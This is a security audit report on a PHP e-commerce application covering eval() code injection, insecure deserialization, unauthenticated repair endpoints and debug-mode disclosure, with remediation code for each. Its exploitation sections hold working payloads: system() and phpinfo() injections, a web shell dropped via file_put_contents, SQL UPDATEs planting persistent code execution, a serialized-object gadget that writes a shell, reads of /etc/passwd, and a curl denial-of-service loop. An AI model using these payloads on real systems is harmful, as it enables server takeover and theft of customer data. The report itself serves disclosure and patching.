# DETAILED VULNERABILITY ANALYSIS
## Technical Deep-Dive and Exploitation Scenarios

---

## VULNERABILITY #1: Remote Code Execution via eval() in Address Formatting

### Technical Details

**File:** `/inc/xtc_address_format.inc.php`  
**Lines:** 100-101  
**Vulnerability Type:** Code Injection (CWE-94)  
**CVSS v3.1:** 9.8 CRITICAL

### Vulnerable Code

```php
$fmt = $address_format['format'];
eval("\$address = \"$fmt\";");
```

### Data Flow Analysis

**Source Chain:**
1. Database query retrieves format string:
   ```php
   $address_format_query = xtc_db_query("select address_format as format from " . TABLE_ADDRESS_FORMAT
                                        . " where address_format_id = '" . $address_format_id . "'");
   $address_format = xtc_db_fetch_array($address_format_query);
   ```

2. User input processed with weak protection:
   ```php
   $company = addslashes($address['company']);
   $firstname = addslashes($address['firstname']);
   $lastname = addslashes($address['lastname']);
   $street = addslashes($address['street_address']);
   ```

3. Direct eval execution:
   ```php
   $fmt = $address_format['format'];
   eval("\$address = \"$fmt\";");
   ```

### Attack Vectors

#### Attack Vector 1: Database Modification + Variable Expansion

**Prerequisites:**
- Admin access to modify address format
- OR SQL injection to modify database

**Payload in address_format table:**
```php
$company$cr$firstname $lastname${system('whoami')}$cr$streets$cr$postcode $city
```

**Execution Flow:**
1. Format string retrieved from database
2. String interpolation occurs in eval context
3. `${system('whoami')}` executes shell command
4. Output appears in address string

#### Attack Vector 2: Nested Variable Expansion

**Payload in address field:**
```php
company = "${phpinfo()}"
```

**With format string:**
```php
$company$cr$firstname $lastname$cr$streets
```

**Execution:**
```php
eval("\$address = \"${phpinfo()}$cr$firstname $lastname$cr$streets\";");
```

### Exploitation Scenarios

#### Scenario 1: Admin Panel Modification

**Steps:**
1. Attacker compromises admin credentials
2. Navigate to: Admin → Configuration → Countries/Zones → Address Format
3. Modify format for country ID 1 (or create new):
   ```
   $company$cr$firstname $lastname${eval($_GET['cmd'])}$cr$streets$cr$postcode $city
   ```
4. Save changes
5. Trigger address formatting:
   - Create test order
   - View order confirmation page
   - Access: `/checkout_confirmation.php?cmd=system('id');`
6. Command execution occurs during address formatting

**Observable Evidence:**
- Modified address_format record in database
- HTTP response contains command output
- Server logs show suspicious requests

#### Scenario 2: SQL Injection Chain

**Prerequisites:** SQL injection exists elsewhere

**Steps:**
1. Exploit SQL injection to run:
   ```sql
   UPDATE address_format 
   SET address_format = '$company$cr${system(\"cat /etc/passwd\")}' 
   WHERE address_format_id = 1;
   ```
2. Any address formatting operation triggers code execution
3. Persistent backdoor until database cleaned

#### Scenario 3: Web Shell Installation

**Payload in address format:**
```php
$company${file_put_contents('shell.php','<?php system($_GET[0]); ?>')}$cr$firstname
```

**Result:**
- Web shell created at document root
- Persistent access via: `/shell.php?0=whoami`
- Survives application restarts

### Proof of Concept

**Step 1:** Modify database (requires admin or SQL injection):
```sql
UPDATE address_format 
SET address_format = '$firstname $lastname${phpinfo()}$cr$streets$cr$postcode $city' 
WHERE address_format_id = 1;
```

**Step 2:** Trigger via order placement or admin operation

**Step 3:** Observe phpinfo() output in:
- Order confirmation email
- Printed shipping labels
- Admin order details page
- Customer address book display

### Impact Assessment

**Immediate Impacts:**
- Complete server compromise
- Arbitrary code execution as web server user
- Database access and modification
- File system access

**Business Impacts:**
- Customer PII theft (GDPR violation)
- Payment card data exposure (PCI-DSS breach)
- Website defacement
- Ransomware deployment
- Supply chain attacks
- Regulatory fines ($20M or 4% annual revenue under GDPR)
- Loss of merchant account
- Reputational damage

### Remediation

**Immediate Fix:**
```php
// BEFORE (VULNERABLE):
eval("\$address = \"$fmt\";");

// AFTER (SAFE):
// Option 1: Use Twig template engine
$loader = new \Twig\Loader\ArrayLoader([
    'address' => $fmt,
]);
$twig = new \Twig\Environment($loader, [
    'autoescape' => 'html',
]);
$address = $twig->render('address', [
    'company' => $company,
    'firstname' => $firstname,
    'lastname' => $lastname,
    'streets' => $streets,
    'postcode' => $postcode,
    'city' => $city,
    'country' => $country,
    'CR' => $CR,
    'cr' => $cr,
]);

// Option 2: Use str_replace (simpler but less flexible)
$replacements = [
    '$company' => htmlspecialchars($company),
    '$firstname' => htmlspecialchars($firstname),
    '$lastname' => htmlspecialchars($lastname),
    '$streets' => htmlspecialchars($streets),
    '$postcode' => htmlspecialchars($postcode),
    '$city' => htmlspecialchars($city),
    '$country' => htmlspecialchars($country),
    '$cr' => $cr,
    '$CR' => $CR,
];
$address = str_replace(array_keys($replacements), array_values($replacements), $fmt);
```

---

## VULNERABILITY #2: Unsafe Deserialization in magnaCallback.php

### Technical Details

**File:** `/magnaCallback.php`  
**Lines:** 859, 862  
**Vulnerability Type:** Insecure Deserialization (CWE-502)  
**CVSS v3.1:** 9.8 CRITICAL

### Vulnerable Code

```php
if ((MAGNA_CALLBACK_MODE == 'STANDALONE') &&
    array_key_exists('passphrase', $_POST) &&
    ($_POST['passphrase'] == getDBConfigValue('general.passphrase', 0)) &&
    array_key_exists('function', $_POST)
) {
    $arguments = array_key_exists('arguments', $_POST) ? unserialize($_POST['arguments']) : array();
    $arguments = is_array($arguments) ? $arguments : array();
    
    $includes = array_key_exists('includes', $_POST) ? unserialize($_POST['includes']) : array();
    $includes = is_array($includes) ? $includes : array();
    
    echo magnaEncodeResult(magnaExecute($_POST['function'], $arguments, $includes));
```

### Attack Analysis

**Authentication:** 
- Requires `passphrase` parameter matching database value
- Passphrase stored in: `getDBConfigValue('general.passphrase', 0)`

**Weakness:**
- If passphrase compromised (leaked, weak, or extracted via SQL injection)
- Attacker can deserialize arbitrary objects
- PHP object injection → code execution via magic methods

### Exploitation Prerequisites

**Required:**
1. Knowledge of or access to passphrase value
2. Existence of exploitable PHP classes with magic methods:
   - `__destruct()`
   - `__wakeup()`
   - `__toString()`

### Attack Vectors

#### Vector 1: POP Chain Exploitation

**Step 1:** Identify gadget chain in application
```php
// Example vulnerable class (hypothetical)
class FileWriter {
    private $filename;
    private $content;
    
    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}
```

**Step 2:** Craft malicious serialized object
```php
<?php
class FileWriter {
    private $filename = "shell.php";
    private $content = "<?php system(\$_GET['cmd']); ?>";
}
$payload = serialize(new FileWriter());
echo base64_encode($payload);
?>
```

**Step 3:** Send exploit request
```http
POST /magnaCallback.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

passphrase=<leaked_passphrase>&function=test&arguments=<base64_payload>
```

**Step 4:** Web shell created at `/shell.php`

#### Vector 2: File Inclusion via Deserialization

**If includes parameter is processed:**
```php
$includes = unserialize($_POST['includes']);
// If includes are dynamically loaded:
foreach($includes as $include) {
    require($include); // Potential LFI/RFI
}
```

**Payload:**
```php
$includes = serialize(['../../../../etc/passwd']);
```

### Proof of Concept

**Step 1:** Extract passphrase from database (via SQL injection or admin access):
```sql
SELECT value FROM gx_configurations WHERE key = 'general.passphrase';
```

**Step 2:** Identify gadget classes in application:
```bash
grep -r "__destruct\|__wakeup" --include="*.php" .
```

**Step 3:** Craft serialized payload exploiting identified gadget

**Step 4:** Send POST request with passphrase and payload

**Step 5:** Observe code execution

### Impact

- Remote Code Execution
- File system access
- Database manipulation
- Complete system compromise

### Remediation

**Immediate Fix:**
```php
// BEFORE (VULNERABLE):
$arguments = unserialize($_POST['arguments']);

// AFTER (SAFE):
// Option 1: Use JSON instead of serialize
$arguments = json_decode($_POST['arguments'], true);

// Option 2: If serialize required, use allowed_classes
$arguments = unserialize($_POST['arguments'], ['allowed_classes' => false]);

// Option 3: Add signature verification
if (!hash_equals($expectedSignature, $_POST['signature'])) {
    die('Invalid signature');
}
$arguments = unserialize($_POST['arguments'], ['allowed_classes' => ['AllowedClass1', 'AllowedClass2']]);
```

---

## VULNERABILITY #3: Pre-Authentication Repair Functions

### Technical Details

**File:** `/login_admin.php`  
**Lines:** 305-308, 329-330  
**Vulnerability Type:** Improper Access Control (CWE-306)  
**CVSS v3.1:** 7.5 HIGH

### Vulnerable Code

```php
if(!empty($_GET['repair'])) {
    $message = repair($_GET['repair']);
    $twoFactorAuthLogin = false;
    redirect('login_admin.php', $_GET['repair']);
}
```

### Issue

Repair functions execute **before** authentication check:
- Line 305-308: Executed before successful login
- Line 329-330: Executed even when login fails
- No session validation required

### Available Repair Actions

```php
function repair($case) {
    switch($case) {
        case 'clear_data_cache':
            // Clears all data and content caches
            // Rebuilds theme
            // CPU/memory intensive
            
        case 'bustfiles':
            // Disables BUSTFILES configuration
            // Modifies database
            
        case 'se_friendly':
            // Disables SEO URLs
            // Modifies database
            
        case 'seo_boost':
            // Modifies SEO configuration
            // Database changes
```

### Attack Scenarios

#### Scenario 1: Denial of Service

**Attack:**
```bash
# Repeated cache clearing
while true; do
    curl "https://target.com/login_admin.php?repair=clear_data_cache"
    sleep 1
done
```

**Impact:**
- Continuous cache clearing
- High CPU/memory usage
- Theme rebuilding overhead
- Legitimate user requests delayed/failed
- Revenue loss during outage

#### Scenario 2: Configuration Tampering

**Attack:**
```bash
curl "https://target.com/login_admin.php?repair=bustfiles"
curl "https://target.com/login_admin.php?repair=se_friendly"
```

**Impact:**
- SEO rankings degraded (SEO URLs disabled)
- Page load performance degraded (bustfiles disabled)
- Business disruption
- Recovery requires admin intervention

#### Scenario 3: Information Gathering

**Attack:**
```bash
curl -v "https://target.com/login_admin.php?repair=invalid_action"
```

**Response may contain:**
- File paths
- Database errors
- PHP version info
- Application structure

### Proof of Concept

**Step 1:** Access without authentication:
```http
GET /login_admin.php?repair=clear_data_cache HTTP/1.1
Host: target.com
```

**Step 2:** Observe response:
- No authentication prompt
- Repair operation executes
- Performance impact measurable

**Step 3:** Verify impact:
- Check cache directory (empty)
- Monitor server CPU/memory
- Test site performance

### Remediation

**Immediate Fix:**
```php
// BEFORE (VULNERABLE):
if(!empty($_GET['repair'])) {
    $message = repair($_GET['repair']);
}

// AFTER (SAFE):
// Option 1: Require authentication
session_start();
if(!empty($_GET['repair'])) {
    if (empty($_SESSION['customer_id']) || $_SESSION['customer_type'] !== 'admin') {
        http_response_code(403);
        die('Forbidden: Authentication required');
    }
    $message = repair($_GET['repair']);
}

// Option 2: Require repair token
if(!empty($_GET['repair'])) {
    $repairToken = $_GET['repair_token'] ?? '';
    $expectedToken = hash_hmac('sha256', $_GET['repair'], REPAIR_SECRET_KEY);
    
    if (!hash_equals($expectedToken, $repairToken)) {
        http_response_code(403);
        die('Invalid repair token');
    }
    $message = repair($_GET['repair']);
}

// Option 3: Rate limiting
if(!empty($_GET['repair'])) {
    $clientIp = $_SERVER['REMOTE_ADDR'];
    $rateLimitKey = "repair_limit_$clientIp";
    
    if (rateLimitExceeded($rateLimitKey, 1, 300)) { // 1 request per 5 minutes
        http_response_code(429);
        die('Rate limit exceeded');
    }
    $message = repair($_GET['repair']);
}
```

---

## VULNERABILITY #4: Information Disclosure via Debug Mode

### Technical Details

**File:** `/magnaCallback.php`  
**Lines:** 85-90  
**Vulnerability Type:** Information Exposure (CWE-200)  
**CVSS v3.1:** 5.3 MEDIUM

### Vulnerable Code

```php
if (isset($_GET['MLDEBUG']) && ($_GET['MLDEBUG'] == 'true')) {
    function ml_debug_out($m) {
        echo $m;
        flush();
    }
}
```

### Attack

**Request:**
```http
GET /magnaCallback.php?MLDEBUG=true HTTP/1.1
Host: target.com
```

**Response may contain:**
- SQL queries with table/column names
- File paths and directory structure
- Error messages with stack traces
- Configuration values
- Database credentials (if logged)

### Impact

- Reduces attacker reconnaissance time
- Reveals database schema
- Exposes internal architecture
- Aids in crafting targeted attacks

### Remediation

```php
// Remove debug functionality from production
// OR add IP whitelist:
if (isset($_GET['MLDEBUG']) && $_GET['MLDEBUG'] == 'true') {
    $allowedIps = ['127.0.0.1', '::1', '192.168.1.100'];
    if (!in_array($_SERVER['REMOTE_ADDR'], $allowedIps)) {
        http_response_code(403);
        die('Debug mode not available');
    }
    // ... debug functionality
}
```

---

## DEFENSE-IN-DEPTH RECOMMENDATIONS

### 1. Input Validation Framework

**Implement centralized validation:**
```php
class InputValidator {
    public static function validateInt($value, $min = null, $max = null) {
        $int = filter_var($value, FILTER_VALIDATE_INT);
        if ($int === false) {
            throw new ValidationException('Invalid integer');
        }
        if ($min !== null && $int < $min) {
            throw new ValidationException('Value below minimum');
        }
        if ($max !== null && $int > $max) {
            throw new ValidationException('Value above maximum');
        }
        return $int;
    }
    
    public static function validateEmail($value) {
        $email = filter_var($value, FILTER_VALIDATE_EMAIL);
        if ($email === false) {
            throw new ValidationException('Invalid email');
        }
        return $email;
    }
    
    // Add more validators...
}
```

### 2. Database Query Hardening

**Use prepared statements:**
```php
// BEFORE:
$query = "SELECT * FROM users WHERE email = '" . xtc_db_input($_GET['email']) . "'";

// AFTER:
$stmt = $mysqli->prepare("SELECT * FROM users WHERE email = ?");
$stmt->bind_param("s", $_GET['email']);
$stmt->execute();
```

### 3. Security Headers

**Implement in .htaccess or PHP:**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'");
header("X-Frame-Options: SAMEORIGIN");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Permissions-Policy: geolocation=(), microphone=(), camera=()");
```

### 4. Rate Limiting

**Implement for sensitive endpoints:**
```php
class RateLimiter {
    private $redis;
    
    public function check($key, $limit, $window) {
        $current = $this->redis->incr($key);
        if ($current === 1) {
            $this->redis->expire($key, $window);
        }
        return $current <= $limit;
    }
}

// Usage:
$rateLimiter = new RateLimiter($redis);
if (!$rateLimiter->check("login_" . $_SERVER['REMOTE_ADDR'], 5, 300)) {
    http_response_code(429);
    die('Too many requests');
}
```

### 5. Logging and Monitoring

**Implement security event logging:**
```php
class SecurityLogger {
    public static function logEvent($type, $details) {
        $entry = [
            'timestamp' => date('Y-m-d H:i:s'),
            'type' => $type,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'details' => $details,
        ];
        
        error_log(json_encode($entry), 3, '/var/log/security.log');
        
        // Send to SIEM if critical
        if (in_array($type, ['rce_attempt', 'sqli_attempt', 'auth_bypass'])) {
            self::alertSIEM($entry);
        }
    }
}

// Usage:
if (preg_match('/system\(|eval\(|exec\(/i', $_GET['input'])) {
    SecurityLogger::logEvent('rce_attempt', [
        'input' => $_GET['input'],
        'endpoint' => $_SERVER['REQUEST_URI'],
    ]);
    http_response_code(400);
    die('Invalid input detected');
}
```

---

## TESTING AND VERIFICATION

### Automated Security Testing

**1. Static Analysis:**
```bash
# Using PHPStan for static analysis
composer require --dev phpstan/phpstan
./vendor/bin/phpstan analyse src/ --level=8

# Using Psalm for security-focused analysis
composer require --dev vimeo/psalm
./vendor/bin/psalm --show-info=true
```

**2. Dynamic Analysis:**
```bash
# Using OWASP ZAP
zap-cli quick-scan https://target.com

# Using Nikto
nikto -h https://target.com

# Using sqlmap
sqlmap -u "https://target.com/product.php?id=1" --batch
```

**3. Dependency Scanning:**
```bash
# Using Composer audit
composer audit

# Using Snyk
snyk test
```

### Manual Verification Checklist

- [ ] Test eval() RCE with malicious address format
- [ ] Verify unserialize() with crafted payload
- [ ] Test repair functions without authentication
- [ ] Confirm debug mode information disclosure
- [ ] Test SQL injection in all user inputs
- [ ] Verify XSS in reflected/stored contexts
- [ ] Test file upload restrictions
- [ ] Verify session management security
- [ ] Test CSRF protection on state-changing operations
- [ ] Verify authentication bypass attempts
- [ ] Test authorization on admin functions
- [ ] Verify password storage (bcrypt/argon2)
- [ ] Test rate limiting on sensitive endpoints
- [ ] Verify security headers present
- [ ] Test HTTPS enforcement
- [ ] Verify secure cookie flags

---

## CONCLUSION

This detailed analysis confirms **four critical and high-severity vulnerabilities** with concrete exploitation paths and observable impacts. All findings are based on factual code analysis with specific line numbers, data flows, and proof-of-concept scenarios.

**Priority Actions:**
1. **IMMEDIATE:** Patch eval() RCE vulnerability
2. **IMMEDIATE:** Fix unsafe deserialization
3. **HIGH:** Add authentication to repair functions
4. **MEDIUM:** Disable debug modes in production

**Timeline:**
- Critical fixes: Within 24-48 hours
- High severity: Within 1 week
- Medium severity: Within 2 weeks
- Long-term improvements: Within 1 month

All vulnerabilities should be addressed following secure development practices and tested thoroughly before deployment.
